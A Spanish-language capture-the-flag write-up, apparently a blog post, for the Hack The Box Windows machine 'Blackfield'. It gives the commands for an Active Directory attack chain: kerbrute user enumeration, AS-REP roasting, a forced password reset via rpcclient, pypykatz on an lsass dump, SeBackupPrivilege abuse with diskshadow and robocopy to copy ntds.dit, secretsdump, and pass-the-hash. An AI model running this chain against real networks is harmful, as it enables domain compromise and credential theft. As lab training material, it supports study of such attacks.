---
title: Blackfield
date: 2022-07-31 13:25:30 +/-TTTT
categories: [HTB MACHINES, Windows]
tags: [getnpusers, kerbrute, forcechangepassword, dmp, pypykatz, diskshadow, robocopy]     # TAG names should always be lowercase
---
En esta máquina usamos un poco de `GetGNPusers`, `Kerbrute`, `Bloodhound`

```shell
kerbrute userenum -d blackfield.local --dc 10.10.10.192 usuariosnuevos.txt
```

```shell
GetNPUsers.py -no-pass -u usuariosnuevos.txt blackfield.local/10.10.10.192
```

Con est obtuvimos una contraseña con privilegios de `ForceChangePassword` por lo que con `rpcclient` pudimos cambiar la contraseña de audit2020

```shell
rpcclient -U 'support' 10.10.10.192
Enter WORKGROUP\support's password:
rpcclient $> setuserinfo2 audit2020 23 'guero123$#'
```

Lo novedoso de esta máquina es encontrar archivos .DMP por lo que por medio de `pypykatz` podemos obtener información del dumpeo.

```shell 
file lsass.DMP
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type

pypykatz lsa minidump lsass.DMP
```

Con esto podemos obtener hashes NT para usuarios del dominio

## ESCALADA

Tenemos un privilegio de `SeBackupPrivilege`, si tratamos de dumpear los hashes NT no serviría porque son hashes a nivel local y necesitamos hashes de los usuarios del directorio activo

![imagen1](/assets/images/blackfield.png)

Para obtener los hashes del dominio, necesitamos el archivo `ntds.dit` que se encuentra en `C:\Windows\NTDS\ntds.dit`, no tenemos permisos de copiarlo, por lo que procedemos a 
usar el privilegio para crearnos una unidad lógica y traernos el archivo y copiarlo con `robocopy`, para hacerlo usamos `diskshadow`

![imagen1](/assets/images/blackfield2.png)

```powershell
C:\Windows\temp\privesc> diskshadow.exe /s C:\Windows\temp\privesc\prueba.txt
```

Con es logramos crear la unidad lógica 

![imagen1](/assets/images/blackfield4.png)

Cuando tengamos problemas con copy pero estemos en el grupo `SeBackupPrivilege` podemos usar `robocopy`

```powershell
robocopy /b z:\Windows\NTDS\ . ntds.dit
```

Nos lo descargamos a nuestra máquina y con `secretsdump` hacer un dump de toos lo hashes de todos los usuarios del directorio activo

```shell
secretsdump.py -system system -ntds ntds.dit LOCAL 
```

Usamos passthehash y estamos dentro.
